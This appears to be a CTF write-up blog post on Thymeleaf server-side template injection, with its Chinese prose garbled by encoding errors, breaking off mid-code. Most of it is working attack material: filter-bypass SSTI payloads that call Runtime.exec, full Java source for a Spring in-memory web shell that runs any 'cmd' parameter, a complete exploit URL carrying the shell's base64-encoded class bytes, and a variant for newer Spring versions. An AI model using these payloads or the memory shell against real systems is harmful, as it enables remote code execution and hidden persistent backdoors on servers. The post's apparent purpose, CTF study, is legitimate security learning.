title="3.0.14ç‰ˆæœ¬åˆ©ç”¨"></a>3.0.14ç‰ˆæœ¬åˆ©ç”¨</h2><p>è¯¥ç‰ˆæœ¬å¯¹å¯¹<code>T</code>å’Œ<code>()</code>ä¸­é—´ç©ºå­—ç¬¦è¿›è¡Œç»•è¿‡ä¿®å¤ï¼ŒåŸæ¥çš„ç©ºæ ¼%20æ²¡æ³•ç»•è¿‡äº†ï¼Œå¯ä»¥ç”¨åå°„ç»•è¿‡</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">land=__$&#123;<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="hljs-string">&#x27;exec&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>.getClass()).invoke(<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="hljs-string">&#x27;getRuntime&#x27;</span>).invoke(<span class="hljs-literal">null</span>),<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;__::<br></code></pre></td></tr></table></figure><p>è¯¥ç‰ˆæœ¬è¿˜å¯¹<code>checkViewNameNotInRequest()</code>æ£€æµ‹å‡½æ•°ä¹Ÿè¿›è¡Œäº†å®Œå–„ï¼š<br>è¦æ±‚ <code>URI</code> çš„å€¼å’Œå…¶ <code>get</code> å‚æ•°åœ¨ <code>StringUtils.pack()</code> ä¹‹åä¸èƒ½å‡ºç° <code>$</code> ï¼Œ<code>*</code> ï¼Œ<code>#</code> ï¼Œ<code>@</code> ï¼Œ<code>~</code> ç´§è·Ÿ <code>&#123;</code> çš„æƒ…å†µã€‚</p><p><img src="https://cdn.clown2024.cn/image-20241214173543160.png" alt="image-20241214173543160"></p><p><img src="https://cdn.clown2024.cn/image-20241214173551685.png" alt="image-20241214173551685"></p><p>ç»•è¿‡æ€è·¯å°±æ˜¯ä¸ä½¿ç”¨<code>$&#123;&#125;</code>æˆ–åœ¨<code>$&#123;</code>ä¹‹é—´åŠ ç‚¹å­—ç¬¦é€ æˆç»•è¿‡ï¼Œæ–‡ç« ä¸­ä½¿ç”¨||å­—ç¬¦æ¥ç»•è¿‡ï¼ŒåŸå› æ˜¯Thymeleaf3.0.15.RELEASEç‰ˆæœ¬ä¹‹å‰<code>LiteralSubstitutionUtil()</code>å‡½æ•°ä¼šç½®ç©º<code>||</code>å­—ç¬¦ï¼Œå…·ä½“çœ‹çœ‹å¸ˆå‚…çš„æ–‡ç« å°±å¥½äº†ï¼š<a href="https://cn-sec.com/archives/3118198.html">https://cn-sec.com/archives/3118198.html</a></p><p>æœ€åç»•è¿‡payloadåŠ ä¸ª||å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">lang=__$||&#123;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;exec&#x27;,&#x27;&#x27;.getClass()).invoke(&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;getRuntime&#x27;).invoke(null),&#x27;open -a calculator.app&#x27;)&#125;__::<br></code></pre></td></tr></table></figure><h2 id="å…¶ä»–ç‰ˆæœ¬"><a href="#å…¶ä»–ç‰ˆæœ¬" class="headerlink" title="å…¶ä»–ç‰ˆæœ¬"></a>å…¶ä»–ç‰ˆæœ¬</h2><p>ä»Thymeleaf3.0.15ç‰ˆæœ¬å¼€å§‹åˆ°ç°åœ¨æœ€æ–°3.1.2.RELEASEç‰ˆæœ¬ï¼Œå°±æ˜¯é’ˆå¯¹Htmlæ–‡ä»¶åˆ©ç”¨ä¸åœçš„æ·»åŠ é»‘åå•äº†ï¼Œè¿™äº›å°±éœ€è¦è‡ªå·±å†å»ç ”ç©¶äº†</p><p>å¸ˆå‚…çš„æ–‡ç« ä¸­æåˆ°æœ€æ–°ç‰ˆæœ¬ruoyiä½¿ç”¨çš„Thymeleaf3.0.15ä¹Ÿæ˜¯å¯ä»¥æ‰“çš„ï¼Œä»¥åæœ‰æœºä¼šçœ‹çœ‹ï¼ˆ</p><h1 id="2022ç½‘é¼æ¯-ç„æ­¦ç»„findit"><a href="#2022ç½‘é¼æ¯-ç„æ­¦ç»„-FindIT" class="headerlink" title="[2022ç½‘é¼æ¯ ç„æ­¦ç»„]FindIT"></a>[2022ç½‘é¼æ¯ ç„æ­¦ç»„]FindIT</h1><p>å› ä¸ºæ²¡æœ‰ç¯å¢ƒå°±çœ‹ç½‘ä¸Šwpæ¢³ç†ä¸€ä¸‹è€ƒç‚¹</p><p>è¯¥é¢˜ç›®çš„è€ƒç‚¹å¦‚ä¸‹ï¼š<br>1ã€thymeleaf SSTI æ¼æ´åŸç†<br>2ã€thymeleaf SSTIæ¼æ´ä¿®å¤ç»•è¿‡æŠ€å·§<br>3ã€Springå†…å­˜é©¬ç¼–å†™<br>4ã€Apache Tomcat 9 url åŒ…å«ç‰¹æ®Šå­—ç¬¦ï¼Œä¾‹å¦‚ &#x2F;ã€[]å¤„ç†ä¸æ›¿ä»£</p><p>è¿™é¢˜æ‰“çš„æ˜¯3.0.12çš„Thymeleafï¼Œå°±ç”¨å‰é¢æ–‡ç« è¯´è¿‡çš„å†…å­˜é©¬å°±å¯ä»¥ç›´æ¥æ‰“äº†ï¼Œå› ä¸ºå‰é¢copyè¿‡æ¥çš„æ—¶å€™å·²ç»æ˜¯æˆå“äº†ï¼Œä¸è¿‡è¿™é‡Œå‚ç…§ä¸€ä¸‹è¿™ç¯‡æ–‡ç« çœ‹çœ‹æ˜¯æ€ä¹ˆæ„é€ å‡ºæ¥çš„ï¼š<a href="https://xz.aliyun.com/t/11688?time__1311=Cq0xRQKQq7qmqGNDQiiQqPGI3oLfObQWa4D">https://xz.aliyun.com/t/11688?time__1311=Cq0xRQKQq7qmqGNDQiiQqPGI3oLfObQWa4D</a></p><p>å…ˆæ˜¯æ³¨å…¥å†…å­˜é©¬çš„exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.http.HttpStatus;<br><span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringRequestMappingMemshell</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">doInject</span><span class="hljs-params">(Object requestMappingHandlerMapping)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;inject-start&quot;</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">registerMapping</span> <span class="hljs-operator">=</span> requestMappingHandlerMapping.getClass().getMethod(<span class="hljs-string">&quot;registerMapping&quot;</span>, Object.class, Object.class, Method.class);<br>            registerMapping.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">executeCommand</span> <span class="hljs-operator">=</span> SpringRequestMappingMemshell.class.getDeclaredMethod(<span class="hljs-string">&quot;executeCommand&quot;</span>, String.class);<br>            <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">patternsRequestCondition</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/*&quot;</span>);<br>            <span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">methodsRequestCondition</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br>            <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">requestMappingInfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(patternsRequestCondition, methodsRequestCondition, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>            registerMapping.invoke(requestMappingHandlerMapping, requestMappingInfo, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpringRequestMappingMemshell</span>(), executeCommand);<br>            msg = <span class="hljs-string">&quot;inject-success&quot;</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            msg = <span class="hljs-string">&quot;inject-error&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> msg;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> ResponseEntity <span class="hljs-title function_">executeCommand</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(value = &quot;cmd&quot;)</span> String cmd)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">execResult</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next();<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseEntity</span>(execResult, HttpStatus.OK);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯éœ€è¦åŠ è½½å­—èŠ‚ç ï¼Œè¿™é‡Œç”¨çš„æ˜¯org.springframework.cglib.core.ReflectUtils#defineClassæ–¹æ³•ï¼Œåªè¦ä¼ å…¥ ç±»åã€ç±»çš„å­—èŠ‚ç å­—èŠ‚æ•°ç»„ å’Œ ç±»åŠ è½½å™¨å°±å¯ä»¥åŠ è½½æ¶æ„ç±»ã€‚</p><p>ç„¶åæˆ‘ä»¬éœ€è¦è°ƒç”¨ä¸Šé¢å†™çš„doInjectæ–¹æ³•æ¥æ³¨å…¥å†…å­˜é©¬ï¼Œè¯¥æ–¹æ³•çš„å‚æ•°éœ€è¦ä¼ å…¥beanå¯¹è±¡ï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„æ–¹å¼æ¥è·å–</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">T (org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>,<span class="hljs-number">0</span>).getBean(T (Class).forName(<span class="hljs-string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;</span>))<br></code></pre></td></tr></table></figure><p>å…¶ç­‰æ•ˆäº</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) org.springframework.web.context.request.RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">requestMappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(Class.forName(<span class="hljs-string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;</span>));<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆçš„payloadå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">T (org.springframework.cglib.core.ReflectUtils).defineClass(<span class="hljs-string">&quot;SpringRequestMappingMemshell&quot;</span>,T (org.springframework.util.Base64Utils).decodeFromUrlSafeString(<span class="hljs-string">&quot;SpringRequestMappingMemshell.classçš„UrlSafebase64ç¼–ç &quot;</span>),<span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.management.loading.MLet(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL[<span class="hljs-number">0</span>],T (java.lang.Thread).currentThread().getContextClassLoader())).doInject(T (org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>,<span class="hljs-number">0</span>).getBean(T (Class).forName(<span class="hljs-string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;</span>)))<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç”¨äº†decodeFromUrlSafeStringæ–¹æ³•å¤„ç†ï¼Œå’ŒTomcat9å¯¹urlçš„ç‰¹æ®Šå­—ç¬¦å¤„ç†æœ‰å…³ï¼Œè¿™æ˜¯å› ä¸ºè¿™é¢˜è¦æ‰“çš„å½¢å¼æ˜¯&#x2F;doc&#x2F;payloadçš„å½¢å¼ï¼Œpayloadé‡Œé¢åŒ…å«äº†&#x2F;ï¼Œtomcatä¼šè®¤ä¸ºè¿™æ˜¯è·¯å¾„åˆ†å‰²ç¬¦å·ï¼Œå¯¼è‡´404ï¼Œå¦‚æœç¼–ç ä¸º%2Få°±ä¼šæŠ¥400é”™è¯¯</p><p>ç”±äºSpringRequestMappingMemshell ç¼–è¯‘åçš„class æ–‡ä»¶ç»è¿‡base64åé‡Œé¢å¯èƒ½ä¼šæœ‰&#x2F; è¿™ä¸ªå­—ç¬¦ï¼Œå› æ­¤è¦ä½¿ç”¨<strong>org.springframework.util.Base64Utils.encodeToUrlSafeString</strong> å…ˆå°†SpringRequestMappingMemshell.class å¤„ç†æˆèƒ½å¤Ÿç”¨åœ¨url ä¼ è¾“çš„base64ç¼–ç ã€‚ç„¶åå†ä½¿ç”¨<strong>org.springframework.util.Base64Utils.decodeFromUrlSafeString</strong> è¿›è¡Œè§£ç æ“ä½œã€‚</p><p>è½¬å˜ä»£ç </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] bytes= Files.readAllBytes(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;SpringRequestMappingMemshell.class&quot;</span>).toPath());<br><span class="hljs-type">String</span> <span class="hljs-variable">safecode</span> <span class="hljs-operator">=</span> Base64Utils.encodeToUrlSafeString(bytes);<br>System.out.println(safecode);<br></code></pre></td></tr></table></figure><p>payload ä¸­åŒ…å«[ ] ç‰¹æ®Šå­—ç¬¦,éœ€è¦URLç¼–ç ä¸€ä¸‹-&gt; %5Bå’Œ%5Dï¼Œæˆ–è€…payloadé‡Œé¢çš„java.net.URL[0] ä¹Ÿå¯ä»¥ç”¨java.net.URL(â€œhttpâ€,â€127.0.0.1â€,â€1.txtâ€)è¿›è¡Œæ›¿ä»£ï¼Œè¿™ä¸ªéšä¾¿å†™å°±è¡Œä¸å½±å“ã€‚</p><p>æœ€ç»ˆçš„payloadå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/doc/;/__$&#123;T (org.springframework.cglib.core.ReflectUtils).defineClass(&quot;SpringRequestMappingMemshell&quot;,T (org.springframework.util.Base64Utils).decodeFromUrlSafeString(&quot;yv66vgAAADQAkwoABgBOCABPCgAGAFAIADAHAFEHAFIHAFMKAAUAVAoABwBVBwBWCAAyBwBXCgAFAFgHAFkIAFoKAA4AWwcAXAcAXQoAEQBeBwBfCgAUAGAKAAoATgoABwBhCABiBwBjCgAZAGQIAGUHAGYKAGcAaAoAZwBpCgBqAGsKABwAbAgAbQoAHABuCgAcAG8HAHAJAHEAcgoAJABzAQAGPGluaXQ-AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAB5MU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbDsBAAhkb0luamVjdAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9TdHJpbmc7AQAPcmVnaXN0ZXJNYXBwaW5nAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA5leGVjdXRlQ29tbWFuZAEAGHBhdHRlcm5zUmVxdWVzdENvbmRpdGlvbgEASExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uOwEAF21ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uAQBOTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb247AQAScmVxdWVzdE1hcHBpbmdJbmZvAQA_TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAHHJlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmcBABJMamF2YS9sYW5nL09iamVjdDsBAANtc2cBABJMamF2YS9sYW5nL1N0cmluZzsBAA1TdGFja01hcFRhYmxlBwBSBwBXBwBjAQAQTWV0aG9kUGFyYW1ldGVycwEAPShMamF2YS9sYW5nL1N0cmluZzspTG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eTsBAANjbWQBAApleGVjUmVzdWx0AQAKRXhjZXB0aW9ucwcAdAEAIlJ1bnRpbWVWaXNpYmxlUGFyYW1ldGVyQW5ub3RhdGlvbnMBADZMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RQYXJhbTsBAAV2YWx1ZQEAClNvdXJjZUZpbGUBACFTcHJpbmdSZXF1ZXN0TWFwcGluZ01lbXNoZWxsLmphdmEMACcAKAEADGluamVjdC1zdGFydAwAdQB2AQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAwAdwB4DAB5AHoBABxTcHJpbmdSZXF1ZXN0TWFwcGluZ01lbXNoZWxsAQAQamF2YS9sYW5nL1N0cmluZwwAewB4AQBGb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbgEAAi8qDAAnAHwBAExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uAQA1b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RNZXRob2QMACcAfQEAPW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8MACcAfgwAfwCAAQAOaW5qZWN0LXN1Y2Nlc3MBABNqYXZhL2xhbmcvRXhjZXB0aW9uDACBACgBAAxpbmplY3QtZXJyb3IBABFqYXZhL3V0aWwvU2Nhbm5lcgcAggwAgwCEDACFAIYHAIcMAIgAiQwAJwCKAQACXEEMAIsAjAwAjQCOAQAnb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL1Jlc3BvbnNlRW50aXR5BwCPDACQAJEMACcAkgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBABFnZXREZWNsYXJlZE1ldGhvZAEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBADsoW0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1ldGhvZDspVgEB9ihMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1JlcXVlc3RNZXRob2RzUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhcmFtc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9IZWFkZXJzUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL0NvbnN1bWVzUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1Byb2R1Y2VzUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1JlcXVlc3RDb25kaXRpb247KVYBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAjb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXMBAAJPSwEAJUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1czsBADooTGphdmEvbGFuZy9PYmplY3Q7TG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzOylWACEACgAGAAAAAAADAAEAJwAoAAEAKQAAAC8AAQABAAAABSq3AAGxAAAAAgAqAAAABgABAAAADAArAAAADAABAAAABQAsAC0AAAAJAC4ALwACACkAAAFZAAkABwAAAJQSAkwqtgADEgQGvQAFWQMSBlNZBBIGU1kFEgdTtgAITSwEtgAJEgoSCwS9AAVZAxIMU7YADU67AA5ZBL0ADFkDEg9TtwAQOgS7ABFZA70AErcAEzoFuwAUWRkEGQUBAQEBAbcAFToGLCoGvQAGWQMZBlNZBLsAClm3ABZTWQUtU7YAF1cSGEynAAtNLLYAGhIbTCuwAAEAAwCHAIoAGQADACoAAAA6AA4AAAAOAAMAEAAgABEAJQASADYAEwBIABQAVQAVAGcAFgCEABcAhwAbAIoAGACLABkAjwAaAJIAHAArAAAAUgAIACAAZwAwADEAAgA2AFEAMgAxAAMASAA_ADMANAAEAFUAMgA1ADYABQBnACAANwA4AAYAiwAHADkAOgACAAAAlAA7ADwAAAADAJEAPQA-AAEAPwAAABMAAv8AigACBwBABwBBAAEHAEIHAEMAAAAFAQA7AAAAAQAyAEQABAApAAAAaAAEAAMAAAAmuwAcWbgAHSu2AB62AB-3ACASIbYAIrYAI027ACRZLLIAJbcAJrAAAAACACoAAAAKAAIAAAAgABoAIQArAAAAIAADAAAAJgAsAC0AAAAAACYARQA-AAEAGgAMAEYAPgACAEcAAAAEAAEASABDAAAABQEARQAAAEkAAAAMAQABAEoAAQBLcwBFAAEATAAAAAIATQ==&quot;),nEw javax.management.loading.MLet(NeW java.net.URL(&quot;http&quot;,&quot;127.0.0.1&quot;,&quot;1.txt&quot;),T (java.lang.Thread).currentThread().getContextClassLoader())).doInject(T (org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;,0).getBean(T (Class).forName(&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;)))&#125;__::main.x<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241214230321805.png" alt="image-20241214230321805"></p><p><img src="https://cdn.clown2024.cn/image-20241214230307833.png" alt="image-20241214230307833"></p><h1 id="ä¸€é¢˜ä¸å‡ºç½‘çš„thymeleaf"><a href="#ä¸€é¢˜ä¸å‡ºç½‘çš„Thymeleaf" class="headerlink" title="ä¸€é¢˜ä¸å‡ºç½‘çš„Thymeleaf"></a>ä¸€é¢˜ä¸å‡ºç½‘çš„Thymeleaf</h1><p><img src="https://cdn.clown2024.cn/image-20241214230438476.png" alt="image-20241214230438476"></p><p>è¿™é¢˜ç»™çš„ä¹Ÿæ˜¯ä¸€ä¸ª3.0.12çš„Thymeleafï¼Œæ˜¯ä¸€ä¸ªè·¯å¾„æ‹¼æ¥å¯¼è‡´çš„æ¼æ´</p><p>ä¸€å¼€å§‹æˆ‘æƒ³ç€è¿™ä¸æ˜¯ç›´æ¥ç§’äº†å—ï¼Œå‘ç°å†…å­˜é©¬æ‰“ä¸è¿›å»ï¼Œæ‰“è¿‡å»ç›´æ¥400äº†</p><p><img src="https://cdn.clown2024.cn/image-20241214230714610.png" alt="image-20241214230714610"></p><p>åŸå› å‡ºåœ¨å†…å­˜é©¬è¿™é‡Œï¼Œè¿™é¢˜ç›®çš„springbootç‰ˆæœ¬æ¯”å‰é¢æœ¬åœ°æµ‹è¯•çš„è¦é«˜ï¼Œæ˜¯2.7.5çš„ç‰ˆæœ¬ï¼Œæˆ‘ä»¬æ¢åˆ°è¯¥ç‰ˆæœ¬ï¼Œçœ‹ä¸€ä¸‹æœ¬åœ°æ‰“æ˜¯ä»€ä¹ˆæŠ¥é”™</p><p><img src="https://cdn.clown2024.cn/image-20241214231157729.png" alt="image-20241214231157729"></p><p>ç„¶åå»æœäº†æœå‘ç°ä¸åŒç‰ˆæœ¬çš„springå†…å­˜é©¬æ˜¯æœ‰å·®åˆ«çš„ï¼ŒæŸ¥æ¼è¡¥ç¼ºäº†ä¸€ä¸‹ï¼Œä¸è¿‡ä¼¼ä¹åªæ˜¯å¯¹controlleræœ‰å½±å“ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="http://www.bmth666.cn/2022/09/27/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html">http://www.bmth666.cn/2022/09/27/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html</a></p><p>å‰é¢çš„å†…å­˜é©¬æ˜¯é€‚åˆ&lt;2.6.0ç‰ˆæœ¬çš„springï¼Œ2.6.0ä¹‹åå®˜æ–¹ä¿®æ”¹äº†urlè·¯å¾„çš„é»˜è®¤åŒ¹é…ç­–ç•¥ï¼Œéœ€è¦é‡æ–°æ„é€ å†…å­˜é©¬äº†ï¼Œæ–‡ç« ä¸­çš„å†…å­˜é©¬å½¢å¼</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br><span class="hljs-type">Field</span> <span class="hljs-variable">configField</span> <span class="hljs-operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="hljs-string">&quot;config&quot;</span>);<br>configField.setAccessible(<span class="hljs-literal">true</span>);<br>RequestMappingInfo.<span class="hljs-type">BuilderConfiguration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);<br><span class="hljs-type">Method</span> <span class="hljs-variable">method2</span> <span class="hljs-operator">=</span> InjectToController2.class.getMethod(<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">ms</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br><span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> RequestMappingInfo.paths(<span class="hljs-string">&quot;/shell&quot;</span>).options(config).build();<br><span class="hljs-type">InjectToController2</span> <span class="hljs-variable">springControllerMemShell</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span 